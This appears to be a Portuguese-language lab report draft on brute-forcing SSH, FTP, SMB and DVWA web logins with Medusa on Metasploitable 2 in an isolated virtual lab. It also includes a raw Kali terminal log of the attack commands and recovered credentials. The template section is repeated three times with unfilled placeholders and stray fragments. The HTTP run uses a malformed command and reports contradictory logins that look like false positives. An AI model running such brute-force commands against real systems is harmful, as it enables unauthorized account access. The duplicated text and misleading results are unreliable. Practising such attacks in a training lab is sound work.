# 🛡️ Projeto Prático de Força Bruta: Medusa, Kali Linux e Ambientes Vulneráveis

## 1. Introdução

Este projeto prático tem como objetivo simular um ataque de força bruta contra serviços de rede (SSH/FTP) e aplicações web (HTTP/DVWA) utilizando o **Kali Linux** e a ferramenta **Medusa**. O exercício visa não apenas comprometer os alvos, mas principalmente exercitar as **medidas de prevenção e as contramedidas** para mitigar esse tipo de ameaça.

**Ferramentas Utilizadas:**
* **Sistema Operacional de Ataque:** Kali Linux (Medusa)
* **Alvos:** Metasploitable 2 e DVWA
* **Wordlist:** [Nome da wordlist, ex: rockyou.txt, ou uma personalizada]
* **Software de Virtualização:** [VirtualBox / VMware]

---

## 2. Configuração do Ambiente Virtual

Todas as máquinas virtuais foram configuradas em uma rede interna, isolando o ambiente de teste.

### 2.1. Diagrama de Rede

* **Kali Linux (Atacante):** IP: `[Seu IP do Kali, ex: 192.168.56.101]`
* **Metasploitable 2 (Alvo 1):** IP: `[Seu IP do Metasploitable, ex: 192.168.56.102]`
* **DVWA (Alvo 2):** IP: `[Seu IP do DVWA, se for diferente]`

### 2.2. Verificação de Conectividade

> **Comando de Verificação:** `ping 192.168.56.102`
>
> **Resultado:** [Descreva o resultado do ping, ex: Pacotes recebidos com sucesso.]

---

## 3. Metodologia de Ataque e Execução (Cenário SSH)

### 3.1. Objetivo

Comprometer o serviço SSH na máquina Metasploitable 2 utilizando um ataque de força bruta no login padrão.

### 3.2. Comando e Parâmetros

Foi utilizada uma wordlist de senhas e um único nome de usuário conhecido (`msfadmin`). O módulo `-M ssh` foi usado para especificar o serviço.

```bash
# SINTAXE: medusa -h [IP] -u [Usuário] -P [Wordlist] -M [Módulo] -f
medusa -h [IP do Metasploitable] -u msfadmin -P /caminho/para/senhas.txt -M ssh -f




# 🛡️ Projeto Prático de Força Bruta: Medusa, Kali Linux e Ambientes Vulneráveis

## 1. Introdução

Este projeto prático tem como objetivo simular um ataque de força bruta contra serviços de rede (SSH/FTP) e aplicações web (HTTP/DVWA) utilizando o **Kali Linux** e a ferramenta **Medusa**. O exercício visa não apenas comprometer os alvos, mas principalmente exercitar as **medidas de prevenção e as contramedidas** para mitigar esse tipo de ameaça.

**Ferramentas Utilizadas:**
* **Sistema Operacional de Ataque:** Kali Linux (Medusa)
* **Alvos:** Metasploitable 2 e DVWA
* **Wordlist:** [Nome da wordlist, ex: rockyou.txt, ou uma personalizada]
* **Software de Virtualização:** [VirtualBox / VMware]

---

## 2. Configuração do Ambiente Virtual

Todas as máquinas virtuais foram configuradas em uma rede interna, isolando o ambiente de teste.

### 2.1. Diagrama de Rede

* **Kali Linux (Atacante):** IP: `[Seu IP do Kali, ex: 192.168.56.101]`
* **Metasploitable 2 (Alvo 1):** IP: `[Seu IP do Metasploitable, ex: 192.168.56.102]`
* **DVWA (Alvo 2):** IP: `[Seu IP do DVWA, se for diferente]`

### 2.2. Verificação de Conectividade

> **Comando de Verificação:** `ping 192.168.56.102`
>
> **Resultado:** [Descreva o resultado do ping, ex: Pacotes recebidos com sucesso.]

---

## 3. Metodologia de Ataque e Execução (Cenário SSH)

### 3.1. Objetivo

Comprometer o serviço SSH na máquina Metasploitable 2 utilizando um ataque de força bruta no login padrão.

### 3.2. Comando e Parâmetros

Foi utilizada uma wordlist de senhas e um único nome de usuário conhecido (`msfadmin`). O módulo `-M ssh` foi usado para especificar o serviço.

```bash
# SINTAXE: medusa -h [IP] -u [Usuário] -P [Wordlist] -M [Módulo] -f
medusa -h [IP do Metasploitable] -u msfadmin -P /caminho/para/senhas.txt -M ssh -f





ss# 🛡️ Projeto Prático de Força Bruta: Medusa, Kali Linux e Ambientes Vulneráveis

## 1. Introdução

Este projeto prático tem como objetivo simular um ataque de força bruta contra serviços de rede (SSH/FTP) e aplicações web (HTTP/DVWA) utilizando o **Kali Linux** e a ferramenta **Medusa**. O exercício visa não apenas comprometer os alvos, mas principalmente exercitar as **medidas de prevenção e as contramedidas** para mitigar esse tipo de ameaça.

**Ferramentas Utilizadas:**
* **Sistema Operacional de Ataque:** Kali Linux (Medusa)
* **Alvos:** Metasploitable 2 e DVWA
* **Wordlist:** [Nome da wordlist, ex: rockyou.txt, ou uma personalizada]
* **Software de Virtualização:** [VirtualBox / VMware]

---

## 2. Configuração do Ambiente Virtual

Todas as máquinas virtuais foram configuradas em uma rede interna, isolando o ambiente de teste.

### 2.1. Diagrama de Rede

* **Kali Linux (Atacante):** IP: `[Seu IP do Kali, ex: 192.168.56.101]`
* **Metasploitable 2 (Alvo 1):** IP: `[Seu IP do Metasploitable, ex: 192.168.56.102]`
* **DVWA (Alvo 2):** IP: `[Seu IP do DVWA, se for diferente]`

### 2.2. Verificação de Conectividade

> **Comando de Verificação:** `ping 192.168.56.102`
>
> **Resultado:** [Descreva o resultado do ping, ex: Pacotes recebidos com sucesso.]

---

## 3. Metodologia de Ataque e Execução (Cenário SSH)

### 3.1. Objetivo

Comprometer o serviço SSH na máquina Metasploitable 2 utilizando um ataque de força bruta no login padrão.

### 3.2. Comando e Parâmetros

Foi utilizada uma wordlist de senhas e um único nome de usuário conhecido (`msfadmin`). O módulo `-M ssh` foi usado para especificar o serviço.

```bash
# SINTAXE: medusa -h [IP] -u [Usuário] -P [Wordlist] -M [Módulo] -f
medusa -h [IP do Metasploitable] -u msfadmin -P /caminho/para/senhas.txt -M ssh -f



                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:82:da:97 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.107/24 brd 192.168.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet 192.168.242.136/24 brd 192.168.242.255 scope global dynamic noprefixroute eth0
       valid_lft 1485sec preferred_lft 1485sec
    inet6 fe80::dd8e:30d5:89a1:ed19/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ping 192.168.242.137       
PING 192.168.242.137 (192.168.242.137) 56(84) bytes of data.
64 bytes from 192.168.242.137: icmp_seq=1 ttl=64 time=21.7 ms
64 bytes from 192.168.242.137: icmp_seq=2 ttl=64 time=0.569 ms
64 bytes from 192.168.242.137: icmp_seq=3 ttl=64 time=0.505 ms
^C
--- 192.168.242.137 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2006ms
rtt min/avg/max/mdev = 0.505/7.585/21.682/9.967 ms
                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ nmap -p 21 -sV -n 192.168.242.137                                                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 01:30 -03
Nmap scan report for 192.168.242.137
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 00:0C:29:FA:DD:34 (VMware)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.87 seconds
                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ echo -e "user\nmsfadmin\nadmin\nroot" > users.txt      
                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt                       
                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.242.137 -U users.txt -P pass.txt -M ftp -t 6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-29 01:31:43 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
2025-11-29 01:31:43 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (2 of 4 complete)
2025-11-29 01:31:43 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
2025-11-29 01:31:43 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
2025-11-29 01:31:43 ACCOUNT FOUND: [ftp] Host: 192.168.242.137 User: msfadmin Password: msfadmin [SUCCESS]
2025-11-29 01:31:45 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: qwerty (2 of 4 complete)
2025-11-29 01:31:45 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (3 of 4 complete)
2025-11-29 01:31:45 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: 123456 (4 of 4 complete)
2025-11-29 01:31:46 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
2025-11-29 01:31:46 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-11-29 01:31:46 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
2025-11-29 01:31:48 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: qwerty (3 of 4 complete)
2025-11-29 01:31:48 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
2025-11-29 01:31:48 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 123456 (1 of 4 complete)
2025-11-29 01:31:49 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
2025-11-29 01:31:49 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-11-29 01:31:50 ACCOUNT CHECK: [ftp] Host: 192.168.242.137 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ echo -e "user\nmsfadmin\nservice" > smb_users.txt         
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt   
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.242.137 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-29 01:34:46 ACCOUNT CHECK: [smbnt] Host: 192.168.242.137 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: 123456 (1 of 4 complete)
2025-11-29 01:34:46 ACCOUNT CHECK: [smbnt] Host: 192.168.242.137 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: password (2 of 4 complete)
2025-11-29 01:34:46 ACCOUNT CHECK: [smbnt] Host: 192.168.242.137 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: Welcome123 (3 of 4 complete)
2025-11-29 01:34:46 ACCOUNT CHECK: [smbnt] Host: 192.168.242.137 (1 of 1, 0 complete) User: user (1 of 3, 1 complete) Password: msfadmin (4 of 4 complete)
2025-11-29 01:34:46 ACCOUNT CHECK: [smbnt] Host: 192.168.242.137 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: password (1 of 4 complete)
2025-11-29 01:34:46 ACCOUNT CHECK: [smbnt] Host: 192.168.242.137 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: 123456 (2 of 4 complete)
2025-11-29 01:34:46 ACCOUNT CHECK: [smbnt] Host: 192.168.242.137 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: msfadmin (3 of 4 complete)
2025-11-29 01:34:46 ACCOUNT FOUND: [smbnt] Host: 192.168.242.137 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
2025-11-29 01:34:46 ACCOUNT CHECK: [smbnt] Host: 192.168.242.137 (1 of 1, 0 complete) User: msfadmin (2 of 3, 2 complete) Password: Welcome123 (4 of 4 complete)
2025-11-29 01:34:46 ACCOUNT CHECK: [smbnt] Host: 192.168.242.137 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: password (1 of 4 complete)
2025-11-29 01:34:46 ACCOUNT CHECK: [smbnt] Host: 192.168.242.137 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: 123456 (2 of 4 complete)
2025-11-29 01:34:47 ACCOUNT CHECK: [smbnt] Host: 192.168.242.137 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: Welcome123 (3 of 4 complete)
2025-11-29 01:34:47 ACCOUNT CHECK: [smbnt] Host: 192.168.242.137 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: msfadmin (4 of 4 complete)
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.242.137 -U users.txt -P pass.txt -M http \ -m PAGE: '/dvwa/login.php' \ -m FORM: 'username=^USER^&password=^PASS^&Login=login' \ -m 'FAIL=Login failed' -t 6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-29 01:36:02 ACCOUNT CHECK: [http] Host: 192.168.242.137 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (1 of 4 complete)
2025-11-29 01:36:02 ACCOUNT FOUND: [http] Host: 192.168.242.137 User: user Password: 123456 [SUCCESS]
2025-11-29 01:36:02 ACCOUNT CHECK: [http] Host: 192.168.242.137 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: qwerty (1 of 4 complete)
2025-11-29 01:36:02 ACCOUNT FOUND: [http] Host: 192.168.242.137 User: msfadmin Password: qwerty [SUCCESS]
2025-11-29 01:36:02 ACCOUNT CHECK: [http] Host: 192.168.242.137 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (1 of 4 complete)
2025-11-29 01:36:02 ACCOUNT FOUND: [http] Host: 192.168.242.137 User: admin Password: 123456 [SUCCESS]
2025-11-29 01:36:02 ACCOUNT CHECK: [http] Host: 192.168.242.137 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-11-29 01:36:02 ACCOUNT FOUND: [http] Host: 192.168.242.137 User: root Password: 123456 [SUCCESS]
2025-11-29 01:36:02 ACCOUNT CHECK: [http] Host: 192.168.242.137 (1 of 1, 0 complete) User: msfadmin (2 of 4, 5 complete) Password: 123456 (2 of 4 complete)
2025-11-29 01:36:02 ACCOUNT FOUND: [http] Host: 192.168.242.137 User: msfadmin Password: 123456 [SUCCESS]
2025-11-29 01:36:02 ACCOUNT CHECK: [http] Host: 192.168.242.137 (1 of 1, 0 complete) User: user (1 of 4, 6 complete) Password: qwerty (2 of 4 complete)
2025-11-29 01:36:02 ACCOUNT FOUND: [http] Host: 192.168.242.137 User: user Password: qwerty [SUCCESS]
2025-11-29 01:36:02 ACCOUNT CHECK: [http] Host: 192.168.242.137 (1 of 1, 0 complete) User: msfadmin (2 of 4, 7 complete) Password: password (3 of 4 complete)
2025-11-29 01:36:02 ACCOUNT FOUND: [http] Host: 192.168.242.137 User: msfadmin Password: password [SUCCESS]
2025-11-29 01:36:02 ACCOUNT CHECK: [http] Host: 192.168.242.137 (1 of 1, 0 complete) User: user (1 of 4, 8 complete) Password: password (3 of 4 complete)
2025-11-29 01:36:02 ACCOUNT FOUND: [http] Host: 192.168.242.137 User: user Password: password [SUCCESS]
2025-11-29 01:36:02 ACCOUNT CHECK: [http] Host: 192.168.242.137 (1 of 1, 0 complete) User: user (1 of 4, 9 complete) Password: msfadmin (4 of 4 complete)
2025-11-29 01:36:02 ACCOUNT FOUND: [http] Host: 192.168.242.137 User: user Password: msfadmin [SUCCESS]
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ 
